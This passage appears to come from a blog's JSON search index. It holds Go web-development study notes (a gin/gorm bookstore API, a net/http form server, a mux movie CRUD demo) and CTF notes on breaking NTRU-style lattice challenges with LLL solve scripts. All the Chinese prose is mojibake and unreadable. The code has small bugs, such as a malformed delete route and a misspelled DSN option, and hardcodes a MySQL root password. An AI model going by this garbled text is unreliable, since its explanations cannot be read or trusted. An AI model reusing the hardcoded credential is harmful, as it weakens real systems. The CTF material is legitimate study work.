æƒ¯å’Œä¸šåŠ¡é€»è¾‘å¯èƒ½ä¸åŒï¼Œä½†ä»è·¯ç”±å…¥æ‰‹é€šå¸¸æ˜¯ä¸€ä¸ªæ¨èçš„æ–¹æ³•ï¼Œå®ƒèƒ½å¸®åŠ©ä½ æ›´æ¸…æ™°åœ°ç»„ç»‡ä»£ç , å¹¶ä¸”è®©ä½ æ›¾ç»è§‰å¾—éš¾ä»¥å®Œæˆçš„ç‹¬ç«‹å¼€å‘ä¸€ä¸ªé¡¹ç›®å˜å¾—è½»æ¾å¯è¡Œã€‚ package routes import ( \"github.com/gin-gonic/gin\" \"github.com/zsm/go-bookstore/pkg/controllers\" ) func Router() *gin.Engine { r := gin.Default() book := r.Group(\"/book\") { book.GET(\"/\", controllers.GetBookTest) book.GET(\"/:bookId\", controllers.GetBookByIdTest) book.POST(\"/\", controllers.CreateBookTest) book.PUT(\"/:bookId\", controllers.UpdateBookTest) book.DELETE(\"/:bookId\", controllers.DeleteBookTest) } return r } 2. ç¼–å†™config/app.go æ–‡ä»¶ package config import ( \"fmt\" \"github.com/jinzhu/gorm\" _ \"github.com/jinzhu/gorm/dialects/mysql\" ) var ( db *gorm.DB ) func Connect() { d, err := gorm.Open(\"mysql\", \"root:mnbvcxz123321.@tcp(127.0.0.1:3306)/gotest?chartset=utf8\u0026parseTime=True\u0026loc=Local\") if err != nil { panic(err) } fmt.Println(\"Connect to database successfully\") db = d } func GetDB() *gorm.DB { return db } 3. models/models.go è¿™é‡Œå…¶å®å’Œdemo3å·®ä¸å¤šï¼Œè¿™é‡Œè¦ç¨å¾®æ³¨æ„ä¸€ç‚¹ï¼ŒæŸ¥è¯¢çš„æ—¶å€™è¦å†™å…¥ID=?ï¼Œè¿™æ ·å»é˜²æ­¢sqlæ³¨å…¥ package models import ( \"github.com/jinzhu/gorm\" \"github.com/zsm/go-bookstore/pkg/config\" ) var db *gorm.DB type Book struct { gorm.Model Name string `json:\"name\"` Author string `json:\"author\"` Publication string `json:\"publication\"` } func init() { config.Connect() db = config.GetDB() db.AutoMigrate(\u0026Book{}) } func (b *Book) CreateBook() *Book { db.NewRecord(b) db.Create(\u0026b) return b } func GetAllBooks() []Book { var Books []Book db.Find(\u0026Books) return Books } func GetBookById(Id int64) (*Book, *gorm.DB) { var getBook Book db := db.Where(\"ID=?\", Id).Find(\u0026getBook) return \u0026getBook, db } func DeleteBook(ID int64) Book { var book Book db.Where(\"ID=?\", ID).Delete(\u0026book) return book } 4. ç¼–å†™ mian.go æ–‡ä»¶ è¿™é‡Œå°±å¾ˆç®€æ´äº†ï¼Œä¸¤è¡Œæå®šbro package main import ( \"fmt\" \"github.com/zsm/go-bookstore/pkg/routes\" ) func main() { r := routes.Router() fmt.Println(\"Server is running on localhost:9010\") r.Run(\":9010\") } 5. ç¼–å†™ controllers/controller.go æ–‡ä»¶ package controllers import ( \"fmt\" \"net/http\" \"strconv\" \"github.com/gin-gonic/gin\" \"github.com/zsm/go-bookstore/pkg/models\" ) // NewBook æ˜¯ä¸€ä¸ªç”¨æ¥åˆ›å»ºæ–°ä¹¦çš„ç»“æ„ä½“ var NewBook models.Book // GetBookTest å‡½æ•°è¿”å›æ‰€æœ‰çš„ä¹¦ç± func GetBookTest(c *gin.Context) { newBooks := models.GetAllBooks() c.JSON(http.StatusOK, newBooks) } // GetBookByIdTest å‡½æ•°è¿”å›æŒ‡å®šIDçš„ä¹¦ç± func GetBookByIdTest(c *gin.Context) { bookId := c.Param(\"bookId\") ID, _ := strconv.ParseInt(bookId, 0, 0) bookDetails, _ := models.GetBookById(ID) // ä»¥JSONæ ¼å¼è¿”å›ä¹¦ç±è¯¦æƒ… c.JSON(http.StatusOK, bookDetails) } // CreateBookTest å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ä¹¦ç±å¹¶è¿”å›è¯¦ç»†ä¿¡æ¯ func CreateBookTest(c *gin.Context) { // åˆå§‹åŒ–ä¸€ä¸ªæ–°ä¹¦ç±ç»“æ„ä½“ var CreateBook = \u0026models.Book{} // ä»è¯·æ±‚ä½“ä¸­è§£æä¹¦ç±ä¿¡æ¯ c.ShouldBindJSON(CreateBook) // åˆ›å»ºä¹¦ç±å¹¶ä¿å­˜åˆ°æ•°æ®åº“ b := CreateBook.CreateBook() // ä»¥JSONæ ¼å¼è¿”å›ä¹¦ç±è¯¦æƒ… c.JSON(http.StatusOK, b) } func DeleteBookTest(c *gin.Context) { bookId := c.Param(\"bookId\") ID, err := strconv.ParseInt(bookId, 0, 0) if err != nil { fmt.Printf(\"è§£æé”™è¯¯ï¼\") } // åˆ é™¤ä¹‹å‰è·å–ä¹¦ç±è¯¦æƒ…, å¹¶åˆ é™¤ä¹¦ç± book, _ := models.GetBookById(ID) models.DeleteBook(ID) c.JSON(http.StatusOK, book) } func UpdateBookTest(c *gin.Context) { var updateBook = \u0026models.Book{} c.ShouldBindJSON(updateBook) bookId := c.Param(\"bookId\") ID, err := strconv.ParseInt(bookId, 0, 0) if err != nil { fmt.Println(\"è§£æé”™è¯¯ï¼\") } bookDetails, db := models.GetBookById(ID) // å¦‚æœNameã€Authorã€Publicationå­—æ®µæœ‰æ›´æ–°ï¼Œåˆ™æ›´æ–°æ•°æ®åº“å¯¹åº”æ•°æ® if updateBook.Name != \"\" { bookDetails.Name = updateBook.Name } if updateBook.Author != \"\" { bookDetails.Author = updateBook.Author } if updateBook.Publication != \"\" { bookDetails.Publication = updateBook.Publication } // ä¿å­˜æ›´æ–°åçš„ä¹¦ç±ä¿¡æ¯åˆ°æ•°æ®åº“ db.Save(\u0026bookDetails) c.JSON(http.StatusOK, bookDetails) } ","date":"2025-07-08","objectID":"/study-golang2/:2:2","tags":["å¼€å‘","study"],"title":"Study Golangã€Œ2ã€","uri":"/study-golang2/"},{"categories":["golang"],"content":"study golang / demo1 ä½œä¸ºä¸€ä¸ªåˆå­¦è€…ï¼Œè·Ÿç€ä½¬çš„æ­¥ä¼å†™äº”ä¸ªå°demoç©ç©ï¼Œç†Ÿæ‚‰ä¸€ä¸‹æ•´ä¸ªçš„å¼€å‘æ–¹å¼å’Œæµç¨‹ ","date":"2025-07-07","objectID":"/study-golang1/:1:0","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["golang"],"content":"é¡¹ç›®æ¶æ„ . â”œâ”€â”€ main.go â””â”€â”€ static â”œâ”€â”€ form.html â””â”€â”€ index.html æœ€åˆçº§çš„ä¸œè¥¿äº†ï¼Œè¿™é‡Œä¸ç”¨ginç»ƒç»ƒä»£ç ï¼Œé™æ€æ–‡ä»¶å°±ä¸å†™äº†ï¼Œè‡ªç”±å‘æŒ¥äº†bro ","date":"2025-07-07","objectID":"/study-golang1/:1:1","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["golang"],"content":"æ•´ä½“ä»£ç  å…ˆåˆå§‹åŒ–ä¸€ä¸‹ï¼Œè¿™é‡Œå°±ä¸€ä¸ªgoæ–‡ä»¶ï¼Œæ‰€ä»¥éšä¾¿äº†go mod init zsm main.go package main import ( \"fmt\" \"log\" \"net/http\" ) func formHandler(w http.ResponseWriter, r *http.Request) { // w ä¸º http.ResponseWriter çš„å®ä¾‹ï¼Œç”¨äºå‘å®¢æˆ·ç«¯è¿”å›å“åº”ã€‚ // r ä¸º http.Request çš„å®ä¾‹ï¼ŒåŒ…å«äº†å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ã€‚ err := r.ParseForm() if err != nil { fmt.Println(w, \"ParseForm() err:%v\", err) return } fmt.Fprintln(w, \"POST request successful\") name := r.FormValue(\"name\") address := r.FormValue(\"address\") fmt.Fprintf(w, \"Name=%s\\n\", name) fmt.Fprintf(w, \"address=%s\\n\", address) } func helloHandler(w http.ResponseWriter, r *http.Request) { //è¯·æ±‚è·¯å¾„ if r.URL.Path != \"/hello\" { http.Error(w, \"404 not found\", http.StatusNotFound) return } //è¯·æ±‚æ–¹æ³• if r.Method != \"GET\" { http.Error(w, \"method is not supported\", http.StatusNotFound) return } fmt.Fprintf(w, \"Hello\") } func main() { fileServer := http.FileServer(http.Dir(\"./static\")) //æŒ‚è½½é™æ€æ–‡ä»¶ http.Handle(\"/\", fileServer) //æŒ‚è½½åˆ°æ ¹ç›®å½• //è·¯å¾„ç»‘å®šå‡½æ•° http.HandleFunc(\"/form\", formHandler) http.HandleFunc(\"/hello\", helloHandler) fmt.Println(\"server is running on 8080\") err := http.ListenAndServe(\":8080\", nil) if err != nil { log.Fatal(err) } } åŸç”Ÿhttpæ¨¡å—æ¯”è¾ƒéº»çƒ¦ç®—æ˜¯ï¼Œç»ƒç»ƒç†Ÿç»ƒåº¦å°±è¡Œäº† ","date":"2025-07-07","objectID":"/study-golang1/:1:2","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["golang"],"content":"å…³äºæŒ‡é’ˆä¼ é€’ æ¯”è¾ƒå¥½ç©çš„æ˜¯åœ¨goé‡Œé¢*æ˜¯ç”¨æ¥å£°æ˜ä»¥åŠæ“ä½œæŒ‡é’ˆçš„ï¼Œè€Œ\u0026æ˜¯ä¸€ä¸ªè¿ç®—ç¬¦ï¼Œå®ƒç”¨äºè·å–ï¼ˆæˆ–æŸ¥æ‰¾ï¼‰å˜é‡çš„åœ°å€ã€‚æ¯”å¦‚ func handleRequest(r *http.Request) { } è¿™é‡Œrèµ‹å€¼ä¸ºåé¢çš„æŒ‡é’ˆï¼Œé‚£æˆ‘è¦è®¿é—®åå†è¯´è§£æçš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥åœ¨ä¸Šé¢è¿›è¡Œæ“ä½œäº†ï¼Œæ¯”å¦‚ func modifyHeader(r *http.Request) { r.Header.Set(\"X-Custom-Header\", \"Value\") // ä¿®æ”¹è¯·æ±‚å¤´ } è¿™æ ·çš„å¥½å¤„æ˜¯å¦‚æœhttp.Requestæ˜¯ä¸€ä¸ªå¤§ç»“æ„ä½“ï¼Œä¼ æŒ‡é’ˆå¯ä»¥å‡å°‘å†…å­˜ä½¿ç”¨è¿˜æœ‰å¤åˆ¶å¼€é”€ï¼Œä¹Ÿé¿å…äº†å°†æ•´ä¸ªç»“æ„ä½“å¤åˆ¶åˆ°å‡½æ•°è°ƒç”¨æ ˆï¼Œæœ‰æ•ˆæé«˜æ€§èƒ½ é‚£æˆ‘æ€ä¹ˆè·å–å®é™…å¯¹è±¡å‘¢ï¼Œç›´æ¥è§£å¼•ç”¨å°±è¡Œäº†ï¼Œå³*r è¿™æ ·çš„å¥½å¤„ä¸ä»…ä»…åœ¨æ€§èƒ½ä¼˜åŒ–ä¸Šï¼Œä¹Ÿä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§ä¸€è‡´çš„ç¼–ç¨‹æ¨¡å¼ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šæœ‰åˆ©äºè§„èŒƒåŒ– ","date":"2025-07-07","objectID":"/study-golang1/:1:3","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["golang"],"content":"study golang / demo2 ä¸ºé™ä½éš¾åº¦ï¼Œæœ¬é¡¹ç›®æœªä½¿ç”¨ DATEBASE ï¼Œä»…ä½¿ç”¨æœ¬åœ° json æ–‡ä»¶å­˜å‚¨æ•°æ®ã€‚ ","date":"2025-07-07","objectID":"/study-golang1/:2:0","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["golang"],"content":"é¡¹ç›®æ¶æ„ . â””â”€src â”œâ”€go-basic-server â”œâ”€go-code â”œâ”€go-keword-scraper â”œâ”€go-movies-curd â”‚ go.mod â”‚ go.sum â”‚ main.go â”‚ â”œâ”€go-rest â”œâ”€go-server â””â”€go-todo è¿™é‡Œæ²¡æœ‰ç”¨æ•°æ®åº“ï¼Œç”¨ç®€å•çš„æ–¹æ³•å…ˆæ¨¡æ‹Ÿä¸€ä¸‹xd ","date":"2025-07-07","objectID":"/study-golang1/:2:1","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["golang"],"content":"æ•´ä½“ä»£ç  å…ˆå†™ç»“æ„ä½“ï¼Œæ–¹ä¾¿åé¢çš„å®šä¹‰å…¨å±€å˜é‡ //ç”µå½± type Movie struct { ID string `json:\"id\"` Isbn string `json:\"isbn\"` Title string `json:\"title\"` Director *Director `json:\"director\"` } //å¯¼æ¼” type Director struct { FirstName string `json:\"firstname\"` LastName string `json:\"lastname\"` } var movies []Movie æ¥ä¸‹æ¥åˆ›å»ºè·¯ç”±è¿˜æœ‰æ’å…¥å‡ ä¸ªçœŸæ•°æ® func main() { //router r := mux.NewRouter() movies = append(movies, Movie{ID: \"1\", Isbn: \"438227\", Title: \"Movie One\", Director: \u0026Director{FirstName: \"John\", LastName: \"Doe\"}}) movies = append(movies, Movie{ID: \"2\", Isbn: \"45455\", Title: \"Movie Two\", Director: \u0026Director{FirstName: \"Steve\", LastName: \"Smith\"}}) r.HandleFunc(\"/movies\", getMovies).Methods(\"GET\") r.HandleFunc(\"/movies/{id}\", getMovie).Methods(\"GET\") r.HandleFunc(\"/movies\", createMovie).Methods(\"POST\") r.HandleFunc(\"/movies/{id}\", updateMovie).Methods(\"POST\") r.HandleFunc(\"/movies{id}\", deleteMovie).Methods(\"DELETE\") fmt.Println(\"server is running on 8080\") log.Fatal(http.ListenAndServe(\":8080\", r)) } è¿™é‡Œå†™äº”ä¸ªapiæ¥å£ï¼Œä¾æ¬¡å†™ä¸Šå» // æ‹¿å…¨éƒ¨çš„ç”µå½± func getMovies(w http.ResponseWriter, r *http.Request) { w.Header().Set(\"Content-Type\", \"application/json\") json.NewEncoder(w).Encode(movies) } // åˆ é™¤æŒ‡å®šç”µå½± func deleteMovie(w http.ResponseWriter, r *http.Request) { w.Header().Set(\"Content-Type\", \"application/json\") // ä» HTTP è¯·æ±‚ r ä¸­æå–è·¯å¾„å‚æ•°ï¼Œå¹¶å°†å®ƒä»¬ä»¥ map[string]string çš„å½¢å¼è¿”å› params := mux.Vars(r) // index æ˜¯å½“å‰å…ƒç´ çš„ç´¢å¼•ï¼ˆå³ä½ç½®ï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ•´æ•°å€¼; item æ˜¯å½“å‰ç´¢å¼•ä½ç½®ä¸Šçš„å…ƒç´ æœ¬èº« for index, item := range movies { if item.ID == params[\"id\"] { // append(movies[:index], movies[index+1:]...) å®é™…ä¸Šåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„åˆ‡ç‰‡ï¼Œå…¶ä¸­åŒ…å«äº†åˆ é™¤æŒ‡å®šå…ƒç´ åçš„æ‰€æœ‰å…ƒç´ ã€‚ movies = append(movies[:index], movies[index+1:]...) // break è¯­å¥ç”¨äºé€€å‡º for å¾ªç¯ break } } json.NewEncoder(w).Encode(movies) } // æ‹¿ä¸€ä¸ªç”µå½± func getMovie(w http.ResponseWriter, r *http.Request) { w.Header().Set(\"Content-Type\",\"application/json\") params := mux.Vars(r) for _, item := range movies { if item.ID == params[\"id\"] { json.NewEncoder(w).Encode(item) return } } } // å¢åŠ ä¸€ä¸ªç”µå½± func createMovie(w http.ResponseWriter, r *http.Request) { w.Header().Set(\"Content-Type\", \"application/json\") var movie Movie // Decode(\u0026movie)ï¼šä¼ å…¥ movie çš„æŒ‡é’ˆï¼Œä»¥ä¾¿è§£ç å™¨å¯ä»¥ç›´æ¥ä¿®æ”¹ movie å˜é‡çš„å†…å®¹ã€‚ // _ è¡¨ç¤ºæˆ‘ä»¬å¿½ç•¥ Decode æ–¹æ³•çš„è¿”å›å€¼ã€‚å¦‚æœè§£ç è¿‡ç¨‹å‘ç”Ÿé”™è¯¯ï¼Œé€šå¸¸ä¼šè®°å½•é”™è¯¯ä¿¡æ¯è€Œä¸æ˜¯ç®€å•åœ°å¿½ç•¥ã€‚ _ = json.NewDecoder(r.Body).Decode(\u0026movie) // rand.Intn(100000000)ï¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•´æ•°ï¼ŒèŒƒå›´æ˜¯ 0 åˆ° 99999999ï¼ˆä¸åŒ…æ‹¬ 100000000ï¼‰ã€‚ movie.ID = strconv.Itoa(rand.Intn(100000000)) // å°† movie æ·»åŠ åˆ° movies åˆ‡ç‰‡çš„æœ«å°¾ã€‚append å‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„åˆ‡ç‰‡ï¼ˆå¦‚æœåŸåˆ‡ç‰‡ç©ºé—´ä¸è¶³ï¼‰ï¼Œå¹¶å°†åŸåˆ‡ç‰‡å’Œæ–°å…ƒç´ åˆå¹¶åˆ°ä¸€èµ·ã€‚ movies = append(movies, movie) json.NewEncoder(w).Encode(movie) } // æ›´æ–°å•ä¸ªç”µå½± func updateMovie(w http.ResponseWriter, r *http.Request) { // è®¾å®šå“åº”å¤´ Content-Type ä¸º application/json w.Header().Set(\"Content-Type\", \"application/json\") params := mux.Vars(r) for index, item := range movies { if item.ID == params[\"id\"] { // åˆ é™¤åŸæœ‰ç”µå½± movies = append(movies[:index], movies[index+1:]...) // åˆ›å»ºæ–°ç”µå½± var movie Movie // åˆ›å»ºä¸€ä¸ª JSON è§£ç å™¨ï¼Œå¹¶ä» HTTP è¯·æ±‚çš„ä¸»ä½“ä¸­è§£ç  JSON æ•°æ®åˆ° `movie` å˜é‡ã€‚ _ = json.NewDecoder(r.Body).Decode(\u0026movie) movie.ID = params[\"id\"] movies = append(movies, movie) json.NewEncoder(w).Encode(movies) return } } } ","date":"2025-07-07","objectID":"/study-golang1/:2:2","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["golang"],"content":"å…³äºæµ‹è¯•æ¥å£ å¾ˆå¤šäººéƒ½å–œæ¬¢ç”¨POSTMANè¿™ä¸ªè½¯ä»¶ï¼Œå…¶å®vscé‡Œé¢æ˜¯æœ‰è¿™ä¸ªæ’ä»¶çš„ï¼Œå¯ä»¥ä½¿ç”¨ï¼Œæˆ–è€…æ˜¯ç”¨REST Clientè¿™ä¸ªæ’ä»¶ï¼Œæ‰‹å†™GET/POSTåŒ…å‘è¿‡å»å³å¯ï¼Œå‰è€…æ¯”è¾ƒè½®æ¤… ","date":"2025-07-07","objectID":"/study-golang1/:2:3","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["golang"],"content":"å…³äºç»“æ„ä½“æ ‡ç­¾ ç»“æ„ä½“é‡Œé¢å®šä¹‰çš„æ—¶å€™ï¼Œä¸€èˆ¬åé¢éƒ½ä¼šåŠ ä¸Šjsonè¿™ä¸ªä¸œè¥¿ï¼Œä¸»è¦çš„ç”¨é€”å°±æ˜¯ç¼–ç å’Œè§£ç ã€æ•°æ®åº“å­—æ®µæ˜ å°„ã€è¡¨å•è§£æå’Œ XML ç¼–ç å’Œè§£ç ï¼Œå¦‚ //ç»“æ„ä½“æ ‡ç­¾æœ€å¸¸è§çš„ç”¨é€”æ˜¯ä¸ JSON ç¼–ç å’Œè§£ç ç›¸å…³ã€‚é€šè¿‡æŒ‡å®š JSON æ ‡ç­¾ï¼Œå¯ä»¥æ§åˆ¶ JSON æ•°æ®ä¸­çš„å­—æ®µåç§°å’Œè¡Œä¸ºã€‚ type Person struct { Name string `json:\"name\"` Age int `json:\"age\"` Email string `json:\"email\"` } // å½“ä½ ä½¿ç”¨ encoding/json åŒ…å¯¹è¿™ä¸ªç»“æ„ä½“è¿›è¡Œç¼–ç æ—¶ï¼Œjson:\"name\" æ ‡ç­¾æŒ‡å®šäº†åœ¨ JSON æ•°æ®ä¸­åº”è¯¥ä½¿ç”¨ \"name\" ä½œä¸ºå­—æ®µåã€‚è¿™ä½¿å¾— JSON æ•°æ®ä¸ Go ç»“æ„ä½“å­—æ®µä¹‹é—´èƒ½å¤Ÿæ­£ç¡®æ˜ å°„ã€‚ import ( \"encoding/json\" \"fmt\" ) func main() { p := Person{Name: \"Alice\", Age: 30, Email: \"alice@example.com\"} jsonData, _ := json.Marshal(p) fmt.Println(string(jsonData)) // è¾“å‡º: {\"name\":\"Alice\",\"age\":30,\u003e\u003e\"email\":\"alice@example.com\"} } //------------------// // ç»“æ„ä½“æ ‡ç­¾ä¹Ÿå¯ä»¥ç”¨äºæ•°æ®åº“æ“ä½œï¼Œé€šè¿‡æ ‡ç­¾æŒ‡å®šå­—æ®µåä¸æ•°æ®åº“è¡¨ä¸­çš„åˆ—åä¹‹é—´çš„æ˜ å°„ã€‚ // è¿™é‡Œï¼Œgorm:\"column:user_name\" æ ‡ç­¾æŒ‡å®šäº†ç»“æ„ä½“å­—æ®µ Name å¯¹åº”æ•°æ®åº“è¡¨ä¸­çš„ user_name åˆ—ã€‚ type User struct { ID int `gorm:\"primary_key\"` Name string `gorm:\"column:user_name\"` Email string `gorm:\"column:user_email\"` } //------------------// // åœ¨ Web å¼€å‘ä¸­ï¼Œç»“æ„ä½“æ ‡ç­¾å¯ä»¥ç”¨äºè¡¨å•è§£æï¼ŒæŒ‡å®šè¡¨å•å­—æ®µçš„åç§°ä¸ç»“æ„ä½“å­—æ®µä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ gin æ¡†æ¶å¤„ç†è¡¨å•æ•°æ®ï¼š // åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œform:\"username\" æ ‡ç­¾è¡¨ç¤ºè¡¨å•å­—æ®µ username å°†è¢«æ˜ å°„åˆ°ç»“æ„ä½“å­—æ®µ Usernameã€‚ type LoginForm struct { Username string `form:\"username\"` Password string `form:\"password\"` } //------------------// // é™¤äº† JSONï¼Œç»“æ„ä½“æ ‡ç­¾ä¹Ÿå¯ä»¥ç”¨äº XML ç¼–ç å’Œè§£ç ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ encoding/xml åŒ…ï¼š // è¿™é‡Œï¼Œxml:\"title\" æ ‡ç­¾æŒ‡å®šäº† XML æ•°æ®ä¸­å­—æ®µåä¸º titleï¼Œè¿™åœ¨ XML ç¼–ç å’Œè§£ç æ—¶èµ·ä½œç”¨ã€‚ type Book struct { Title string `xml:\"title\"` Author string `xml:\"author\"` } ","date":"2025-07-07","objectID":"/study-golang1/:2:4","tags":["å¼€å‘","study"],"title":"Study golangã€Œ1ã€","uri":"/study-golang1/"},{"categories":["CTF"],"content":"å‰è¨€ ç”¨æ¥è®°å½•æˆ‘çš„æ ¼å¯†ç å­¦ä¹ ï¼Œå‚è€ƒèµ„æ–™æ˜¯NSSå·¥åŠå’Œä¸€äº›blog ","date":"2025-06-29","objectID":"/ge-1/:1:0","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"NTRU ","date":"2025-06-29","objectID":"/ge-1/:2:0","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"1.å…¥é—¨é¢˜ task.py import gmpy2 from secret import flag from Crypto.Util.number import * f = bytes_to_long(flag) p = getPrime(512) g = getPrime(128) h = gmpy2.invert(f+20192020202120222023, p) * g % p print('h =', h) print('p =', p) æƒ³è¦flagå°±è¦æ±‚å‡ºfï¼Œf=f+20192020202120222023ï¼Œæœ€åå‡å»è¿™ä¸ªæ•°å°±å¥½äº†ï¼Œé‚£ä¹ˆå·²çŸ¥çš„å¼å­å°±å˜æˆäº† $$ h \\equiv f^{-1}g \\mod p \\\\ hf \\equiv g \\mod p \\\\ g=hf-kp \\\\ \\begin{pmatrix} f\u0026-k \\end{pmatrix} \\begin{pmatrix} 1\u0026h\\\\ 0\u0026p \\end{pmatrix}= \\begin{pmatrix} f\u0026g \\end{pmatrix} $$åœ¨æœ¬è´¨çš„è®¡ç®—ä¸­ï¼Œä»–æ˜¯æ‹¿å‘é‡(h,1)(p,0)å»åšçº¿æ€§ç»„åˆï¼Œå¦‚æœä¸¤ç»„æ˜¯$x_1$$x_2$ï¼Œé‚£ä¹ˆå°±å˜æˆäº† $x_1h+x_2p,x_1$ï¼Œè€Œå½“$x_1=f,x_2=-k$å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœ exp.sage from sage.all import* from Crypto.Util.number import * h = p = zsm=Matrix(ZZ,[[1,h],[0,p]]) f,g=zsm.LLL()[0] print(long_to_bytes(abs(f)-20192020202120222023)) ä¸æ­¤é¢˜ç›¸ä¼¼çš„è¿˜æœ‰LitCTF2025çš„babyï¼Œä¸è¿‡é‚£ä¸ªéœ€è¦é…å¹³ä¸€ä¸‹ ","date":"2025-06-29","objectID":"/ge-1/:2:1","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"2.HNCTF 2022 WEEK2 task.py from Crypto.Util.number import * from hashlib import * p = getPrime(2048) f = getPrime(1024) g = getPrime(768) h = pow(f,-1,p)*g%p verify = sha256(bytes.fromhex(hex(f+g)[2:])).hexdigest() print(f'verify = {verify}') print(f'p = {p}') print(f'h = {h}') print('NSSCTF{' + md5(bytes.fromhex(hex(f+g)[2:])).hexdigest() + '}') $$ h\\equiv f^{-1}g \\mod p \\\\ hf\\equiv g \\mod p \\\\ g=hf-kp \\\\ \\begin{pmatrix} f\u0026-k \\end{pmatrix} \\begin{pmatrix} 1\u0026h\\\\ 0\u0026p \\end{pmatrix}= \\begin{pmatrix} f\u0026g \\end{pmatrix} $$ä½ ä¼šå‘ç°å’Œä¸Šä¸€é¢˜å·®ä¸å¤šçš„æ„Ÿè§‰() exp.sage from sage.all import* from Crypto.Util.number import * from hashlib import * verify = \"\" p = h = zsm=Matrix(ZZ,[[1,h],[0,p]]) f,g=zsm.LLL()[0] if sha256(bytes.fromhex(hex(abs(f)+abs(g))[2:])).hexdigest() == verify: flag = 'NSSCTF{' + md5(bytes.fromhex(hex(f+g)[2:])).hexdigest() + '}' print(flag) ","date":"2025-06-29","objectID":"/ge-1/:2:2","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"3.ä¸çŸ¥é“å“ªæ¥çš„ task.py from Crypto.Util.number import * p = getPrime(1024) f = getPrime(400) g = getPrime(512) r = getPrime(400) h = inverse(f, p) * g % p m = b'******' m = bytes_to_long(m) c = (r*h + m) % p print(f'p = {p}') print(f'h = {h}') print(f'c = {c}') å…ˆæŠŠhä»£å…¥è¿›å»ï¼Œç„¶ååŒ–ç®€ $$ c \\equiv (r \\times f^{-1} \\times g+m) \\mod p \\\\ fc \\equiv (rg+mf) \\mod p\\\\ mf \\equiv (fc-rg) \\mod p \\\\ mf \\equiv fc \\mod p \\mod g \\\\ m \\equiv (fc \\mod p) \\times f^{-1} \\mod g $$è¦æ±‚må°±è¦çŸ¥é“fcpgï¼Œcpå·²çŸ¥ï¼Œæ±‚fg $$ \\begin{pmatrix} f\u0026-k \\end{pmatrix} \\begin{pmatrix} 1\u0026h\\\\ 0\u0026p \\end{pmatrix}= \\begin{pmatrix} f\u0026g \\end{pmatrix} $$exp.sage from sage.all import* from Crypto.Util.number import * p = h = c = zsm=Matrix(ZZ,[[1,h],[0,p]]) f,g=zsm.LLL()[0] f,g=abs(f),abs(g) m=((f*c%p)*inverse(f,g))%g print(long_to_bytes(m)) ","date":"2025-06-29","objectID":"/ge-1/:2:3","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"4.æ·±è‚²æ¯2021 task.py from Crypto.Util.number import * import gmpy2 from flag import flag def encrypt(plaintext): p = getStrongPrime(3072) m = bytes_to_long(plaintext) r = getRandomNBitInteger(1024) while True: f = getRandomNBitInteger(1024) g = getStrongPrime(768) h = gmpy2.invert(f, p) * g % p c = (r * h + m * f) % p return (h, p, c) h, p, c = encrypt(flag) with open(\"cipher.txt\", \"w\") as f: f.write(\"h = \" + str(h) + \"\\n\") f.write(\"p = \" + str(p) + \"\\n\") f.write(\"c = \" + str(c) + \"\\n\") æ ¼å’Œå‰é¢æ„é€ çš„ä¸€æ ·ï¼Œä¸»è¦æ˜¯cçš„åŒ–ç®€ä¸ä¸€æ ·ï¼Œè¿™é‡Œå°±çœç•¥äº† ","date":"2025-06-29","objectID":"/ge-1/:2:4","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"NSSå·¥åŠé¢˜ç›® ","date":"2025-06-29","objectID":"/ge-1/:3:0","tags":["crypto"],"title":"æ ¼å­¦ä¹ ç¬”è®°","uri":"/ge-1/"},{"categories":["CTF"],"content":"P3 task.py from Crypto.Util.number import * import random flag = b'******' m = bytes_to_long(flag) a = getPrime(1024) b = getPrime(1536) p = getPrime(512) q = getPrime(512) r = random.randint(2**14, 2**15) assert ((p-r) * a + q) % b \u003c 50 c = pow(m, 65537, p*q) print(f'c = {c}') print(f'a = {a}') print(f'b = {b}') $$ x \\equiv ((p-r) \\times a+q) \\mod b \\\\ x-q \\equiv (p-r)\\times a \\mod b \\\\ x-q=(p-r)\\times a+kb \\\\ \\begin{pmatrix} p-r\u0026k \\end{pmatrix} \\begin{pmatrix} a\u00261\\\\ b\u00260 \\end{pmatrix}= \\begin{pmatrix} x-q\u0026p-r \\end{pmatrix} $$xréƒ½æ˜¯å¾ˆå°çš„æ•°ï¼Œå¯ä»¥çˆ†ç ´ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå…ˆçˆ†ç ´rå†çˆ†ç 